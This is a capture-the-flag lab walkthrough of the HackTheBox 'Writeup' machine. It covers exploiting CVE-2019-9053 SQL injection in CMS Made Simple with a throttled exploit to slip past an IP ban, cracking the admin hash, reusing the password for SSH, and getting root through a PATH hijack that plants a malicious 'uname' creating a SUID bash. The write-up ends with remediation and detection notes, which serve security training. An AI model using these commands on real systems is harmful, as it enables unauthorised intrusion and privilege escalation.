# HackTheBox — Writeup

> **OS:** Linux (Devuan)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-14

**Kill chain:** `robots.txt → CMS Made Simple 2.2.9.1 → CVE-2019-9053 (blind SQLi) → cracked hash → password reuse → SSH foothold → PATH hijack via root MOTD → root`

---

## Overview

Writeup is an easy Linux box that rewards careful, low-noise enumeration. It runs an outdated **CMS Made Simple** install vulnerable to an unauthenticated SQL injection (CVE-2019-9053), which leaks a salted admin password hash. That password is reused for SSH, giving a foothold. Privilege escalation abuses a subtle chain: the local user is in the `staff` group, `/usr/local/bin` is group-writable and sits first in `root`'s `PATH`, and the dynamic MOTD run on every SSH login executes `uname` by bare name as root — a textbook PATH hijack.

The box also runs an **active anti-bruteforce control** that bans your IP on burst traffic, which shapes the entire approach: no fuzzing, no fast automated exploitation. Adapting tooling to that control is half the exercise.

---

## Recon

### Port scan

```bash
nmap -sV -sC -T5 10.129.55.223
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry
|_/writeup/
```

Two ports: SSH and HTTP. The web root returns *"Nothing here yet."*, but `robots.txt` discloses a disallowed path: **`/writeup/`**.

### Web enumeration

Browsing `/writeup/` reveals a small site hosting the author's HTB write-ups (pages: *Home / ypuffy / blue / writeup*). Every page carries the footer:

> *Pages are hand-crafted with vim. NOT.*

The "NOT" is a hint that the pages are **generated**, not static — i.e. there's a CMS behind them. Fingerprinting the server first:

```bash
whatweb http://10.129.55.223
```

```
Apache[2.4.25], Email[jkr@writeup.htb], HTTPServer[Debian Linux], Title[Nothing here yet.]
```

Two useful pulls: an email/username **`jkr`** and a virtual host **`writeup.htb`** (added to `/etc/hosts`).

### The anti-bruteforce control

An important early observation — **noisy tools get the connection refused**:

| Tool | Behaviour |
|------|-----------|
| `whatweb`, `curl -I` (single request) | ✅ 200 OK |
| `nikto` | ❌ "Unable to connect" |
| `wafw00f` | ❌ "Connection refused / site appears down" |

Single, spaced requests succeed; anything that bursts many requests trips an **IP ban** (the box runs a fail2ban-style daemon on port 80). Practical consequence: **do not run gobuster / ffuf / dirb** against this box, and any exploit must be throttled. This constraint drives every later decision.

### CMS fingerprint

CMS Made Simple doesn't advertise its version, so pull the shipped changelog (a single request — safe):

```bash
curl -s http://10.129.55.223/writeup/doc/CHANGELOG.txt | head
```

```
Version 2.2.9.1
MicroTiny v2.2.4
Phar Installer v1.3.7
```

**Product + exact version: CMS Made Simple 2.2.9.1.** This is the pivot point of the whole recon phase.

---

## Exploitation — CVE-2019-9053

```bash
searchsploit cms made simple 2.2
```

CMSMS ≤ 2.2.9 has an **unauthenticated time-based blind SQL injection** (CVE-2019-9053, EDB **46635**) in the News module's `moduleinterface.php`. It extracts the admin's username, email, salt, and password hash character-by-character.

### Adapting the exploit to the rate limit

The public PoC is Python 2 and, more importantly, its **linear character-by-character extraction fires hundreds of back-to-back requests** — which trips the box's IP ban within ~30 requests. Two changes made it viable:

1. **Ported to Python 3** (print statements, `hashlib` byte-encoding, `latin-1` decoding for `rockyou.txt`).
2. **Adaptive throttle** — a low base delay before each request, plus a `try/except` that catches the ban (`ConnectionError`), sleeps a cooldown, and retries the same request instead of crashing. Fast on the instant non-matches, self-healing when banned.

> **Note:** This is the core lesson of the box on the offensive side — an off-the-shelf exploit was *incompatible with a defensive control* and had to be tuned to work. Worth documenting explicitly.

Running the throttled exploit:

```bash
python3 46635.py -u http://writeup.htb/writeup --crack -w /usr/share/wordlists/rockyou.txt
```

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Password hash found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

The CMS hashes as `md5($salt . $password)`; the exploit's `--crack` walks `rockyou.txt` locally (no requests to the box) and recovers the plaintext:

**`jkr : raykayjay9`**

> If cracking manually offline: `hashcat -m 20 '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' rockyou.txt`, or John's `dynamic_4` format (`md5($s.$p)`) — useful when a VM has no OpenCL runtime for hashcat.

---

## Foothold — password reuse

The recovered password is a **CMS** credential, but `jkr` is also a real system account and SSH is open. Trying the same password:

```bash
ssh jkr@10.129.55.223
# password: raykayjay9
```

```
Linux writeup 6.1.0-13-amd64 x86_64 GNU/Linux
jkr@writeup:~$ cat user.txt
03a27718…[REDACTED]
```

**Password reuse** across the CMS and the system account is the entire foothold. `user.txt` captured.

---

## Privilege Escalation — PATH hijack

Local enumeration with **linpeas** (transferred via `python3 -m http.server` on the attacker, `wget` on the victim) points at the login/execution environment rather than kernel or SUID issues.

### The writable PATH directory

```bash
jkr@writeup:~$ id
uid=1000(jkr) ... groups=...,50(staff),...
```

`jkr` is in the **`staff`** group. Checking the directories in `PATH`:

```bash
ls -ld /usr/local/bin /usr/bin /bin /usr/local/games /usr/games
```

```
drwx-wsr-x 2 root staff  /usr/local/bin
drwxrwsr-x 2 root staff  /usr/local/games
drwxr-xr-x 2 root root   /usr/bin
drwxr-xr-x 2 root root   /bin
```

`/usr/local/bin` is **group-writable by `staff`** and comes **first** in `PATH`, ahead of `/usr/bin` and `/bin`. That means anything root runs by *bare command name* will resolve to `/usr/local/bin` first — if we can find such a call.

### Finding the trigger with pspy

The missing piece is a root process that calls a command without an absolute path. **pspy** (same http.server → wget transfer) monitors process execution without root. Running it, then opening a **second SSH session** to trigger login activity:

```
UID=0 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
             run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
UID=0 run-parts --lsbsysinit /etc/update-motd.d
UID=0 uname -rnsom
```

On every SSH login, root regenerates the dynamic MOTD via `run-parts`, and one of the `/etc/update-motd.d` scripts runs **`uname`** — **by bare name, as root**, with `/usr/local/bin` first in that `PATH`. Every precondition for a PATH hijack is satisfied at once:

- ✅ writable dir early in `PATH` → `/usr/local/bin` (staff-writable)
- ✅ root-context process → the MOTD generator
- ✅ bare command call → `uname`

### The hijack

```bash
# Plant a malicious 'uname' in the writable, PATH-first directory
cat > /usr/local/bin/uname <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /usr/local/bin/uname
```

Trigger it by opening a **fresh SSH session** as `jkr` (from another terminal) — root runs the MOTD, which runs our `uname`, which drops a SUID copy of bash. Then:

```bash
jkr@writeup:~$ /tmp/rootbash -p
rootbash-4.4# whoami
root
rootbash-4.4# cat /root/root.txt
5a2066a5…[REDACTED]
```

`-p` preserves the SUID euid so we land as root. **Rooted.**

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| CMS Made Simple 2.2.9.1 — unauth SQLi (CVE-2019-9053) | High | Update CMSMS to a patched release; restrict `moduleinterface.php` exposure. |
| Weak, crackable admin password | Medium | Enforce strong password policy; the salted-MD5 scheme is weak — migrate to bcrypt/argon2. |
| Password reuse (CMS ↔ system account) | High | Separate credentials per service; the same secret should never span an app and a shell account. |
| `staff`-writable `/usr/local/bin` in root's `PATH` | High | Remove group-write on PATH directories; never place a group-writable dir ahead of system dirs in a root `PATH`. |
| Root MOTD calls `uname` by bare name | High | Use absolute paths in privileged scripts (`/bin/uname`); this alone breaks the hijack. |

---

## Detection notes (blue-team view)

Since much of this chain is observable, a few things a defender/detection engineer would key on:

- **The SQLi extraction is loud in web logs** — hundreds of `moduleinterface.php?...m1_idlist=...sleep(...)` requests from one source in a short window, each with `sleep()` / hex `like 0x...` patterns. The box's own IP-ban control is effectively a crude detection+response for exactly this.
- **Password reuse** shows up as a successful SSH login for `jkr` from an external IP shortly after web exploitation — correlating web-app and auth logs by source IP surfaces it.
- **The PATH hijack** is the highest-signal event: a **write to `/usr/local/bin`** by a non-root user, followed by execution of a binary from that path by a **root** process. File-integrity monitoring on `/usr/local/bin` plus process-execution telemetry (the `uname` parent being `run-parts`/MOTD as UID 0) would both fire.

---

## Lessons

- **Enumerate the app, not just the server.** Apache's version was a dead end; the CMS version was the whole game.
- **Treat defensive controls as findings, not obstacles.** The IP ban dictated tooling choices — recognising it early saved time and became report material.
- **Privesc is often a chain of small facts**, not one exploit: group membership + PATH order + a bare-name call. None is dangerous alone.
